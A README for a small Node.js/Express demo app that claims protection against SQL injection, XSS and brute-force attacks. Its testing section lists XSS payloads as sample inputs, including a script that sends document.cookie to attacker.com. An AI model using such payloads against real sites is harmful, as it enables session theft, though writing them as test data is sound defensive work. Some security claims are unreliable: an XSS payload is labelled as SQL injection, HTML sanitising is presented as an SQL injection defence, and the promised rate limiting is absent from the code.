
# Simple Web Security Application

This project demonstrates a simple web application that includes features like brute force protection, SQL injection prevention, and XSS mitigation. It showcases best practices in securing web applications using Node.js and Express, with middleware for request validation, rate limiting, and logging malicious attempts.

---

## 1. **Project Overview & Objectives**

**Objective:** This project implements a secure web application with features designed to mitigate common security vulnerabilities, including SQL injection, Cross-Site Scripting (XSS), and brute force attacks. The goal is to demonstrate best practices in web security using Node.js, Express, and middleware for request validation and sanitization.

---

## 2. **System Architecture**

**Components:**
- **Server:** Handles HTTP requests, processes data, and implements security measures.
- **Routes:** Manages application routing, ensuring appropriate endpoints are secured.
- **Middleware:** Provides request validation and security mechanisms to ensure safe data processing.
- **Public:** Hosts the frontend components, including HTML, CSS, and JavaScript for the user interface.
- **Controllers:** Contains logic for processing business requirements and handling HTTP requests.
- **LogMaliciousAttempts:** Records potentially malicious activity to be reviewed.

**Technologies Used:**
- **Language:** JavaScript (Node.js)
- **Frameworks:** Express.js
- **Frontend:** HTML, CSS, JavaScript
- **Middleware:** Custom request validation and sanitization functions

---

## 3. **Code Structure**

```
Simple-Web-Security/
|-- node_modules/                 # Project dependencies
|-- src/                          # Backend source code
|      |-- routes/                 # Route definitions
|              |-- index.js        # Route handler
|      |-- middlewares/            # Middleware functions
|              |-- requestValidator.js  # Input validation and sanitization
|      |-- controllers/            # Request processing logic
|              |-- homeController.js   # Home page and form handling
|      |-- logMaliciousAttempts/   # Malicious attempt function recorder
|-- public/                       # Frontend files
|      |-- app.js                  # Client-side JavaScript
|      |-- index.html              # HTML structure
|      |-- style.css               # CSS styling
|-- maliciousAttempts.log         # Record of malicious attempts
|-- server.js                     # Server entry point
|-- package-lock.json             # Dependency versions
|-- package.json                  # Project metadata and dependencies
|-- README.md                     # Project documentation
```

**Key Directories:**
- **src/routes:** Defines application routes and maps them to appropriate controllers.
- **src/middlewares:** Contains middleware functions for request validation and security.
- **src/controllers:** Manages the core logic and handles HTTP requests.
- **src/logMaliciousAttempts:** Records potentially malicious activities, such as failed login attempts.
- **public:** Hosts static files for the frontend.
- **server.js:** Entry point for starting the application.

---

## 4. **Installation**

Follow the steps below to set up the project on your local machine:

### 1. Create a New Project Directory
```bash
mkdir my-web-security-app
cd my-web-security-app
```

### 2. Initialize a Node.js Project
```bash
npm init -y
```

### 3. Install Required Dependencies
```bash
npm install express cors express-rate-limit node-cache
```

### 4. Start the Server
```bash
node server.js
```

### 5. Error Handling

If you encounter the following errors, install the missing modules:

**express-rate-limit (MODULE NOT FOUND)**
```bash
npm install express-rate-limit
```

**node-cache (MODULE NOT FOUND)**
```bash
npm install node-cache
```

If you find the port `3000` already in use, run:
```bash
netstat -ano | findstr :3000
taskkill /PID ID /F
```

---

## 5. **Frontend Implementation**

**Files:**
- `public/index.html`
- `public/style.css`
- `public/app.js`

**Key Features:**
- **index.html:** Basic structure with a secure form to collect input.
- **style.css:** Minimal styling to enhance the form appearance.
- **app.js:** Client-side JavaScript to handle form submission.

**Example Form in HTML:**
```html
<form id="secureForm" action="/submit" method="POST">
  <input type="text" name="input" placeholder="Enter text" required />
  <button type="submit">Submit</button>
</form>
```

---

## 6. **Middleware Implementation**

**File:** `src/middlewares/requestValidator.js`

This middleware is responsible for validating incoming requests to prevent SQL injection and XSS attacks.

**Key Features:**
- **Sanitization:** Escapes special characters to prevent SQL injection and XSS attacks.
- **Validation:** Ensures request payloads match expected formats.
- **Rate Limiting:** Limits request rates to prevent brute force attacks.

**Example Code:**
```javascript
const sanitize = require('sanitize-html');

function validateRequest(req, res, next) {
  try {
    const sanitizedBody = {};
    for (const key in req.body) {
      sanitizedBody[key] = sanitize(req.body[key]);
    }
    req.body = sanitizedBody;
    next();
  } catch (error) {
    res.status(400).send({ error: 'Invalid input' });
  }
}

module.exports = validateRequest;
```

---

## 7. **Route Implementation**

**File:** `src/routes/index.js`

Defines the routes for the application and integrates middleware for validation.

**Example Code:**
```javascript
const express = require('express');
const router = express.Router();
const homeController = require('../controllers/homeController');
const validateRequest = require('../middlewares/requestValidator');

// Define routes
router.get('/', homeController.getHome);
router.post('/submit', validateRequest, homeController.handleFormSubmission);

module.exports = router;
```

---

## 8. **Controller Implementation**

**File:** `src/controllers/homeController.js`

Handles the business logic for processing requests.

**Example Code:**
```javascript
exports.getHome = (req, res) => {
  res.sendFile('index.html', { root: './public' });
};

exports.handleFormSubmission = (req, res) => {
  const { input } = req.body;
  res.send({ message: `Processed input: ${input}` });
};
```

---

## 9. **Log Malicious Attempts**

**File:** `src/logMaliciousAttempts/index.js`

This function records potentially malicious attempts (e.g., repeated failed login attempts or invalid inputs) to a log file for further review and analysis.

**Example Code:**
```javascript
const fs = require('fs');

function logAttempt(attemptDetails) {
  const logMessage = `${new Date().toISOString()} - Malicious attempt: ${attemptDetails}
`;
  fs.appendFileSync('maliciousAttempts.log', logMessage);
}

module.exports = logAttempt;
```

---

## 10. **Security Features**

- **Anti-SQL Injection:** The middleware escapes special characters in user input to prevent SQL injection attacks.
- **Anti-XSS:** Inputs are sanitized to remove malicious scripts, safeguarding against Cross-Site Scripting (XSS) attacks.
- **Brute Force Prevention:** Rate limiting and request throttling mechanisms are implemented to prevent brute force login attempts.
- **Malicious Attempt Logging:** Attempts such as repeated invalid inputs or unusual behavior are logged for further analysis.

---

## 11. **Testing & Troubleshooting**

**Testing:**
- Use tools like **Postman** to test the application’s endpoints.
- Ensure that invalid inputs are properly rejected and the application responds with appropriate error messages.

**Sample Inputs:**

- **Username and Password:**
```json
{
  "username": "joxyle",
  "password": "jhon"
}
```

- **SQL Injection:**
```json
{
  "username": "<script>alert('XSS')</script>",
  "password": "password123"
}
```

- **XSS Injection Examples:**
```json
{
  "username": "<img src='x' onerror='alert(1)'>",
  "password": "password123"
}

{
  "username": "<img src='nonexistent.jpg' onload='alert("XSS")'>",
  "password": "password123"
}

{
  "username": "<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>",
  "password": "password123"
}

{
  "username": "<img src='x' onerror='eval(atob("YWxlcnQoJ1hTUycp")' />",
  "password": "password123"
}
```

---

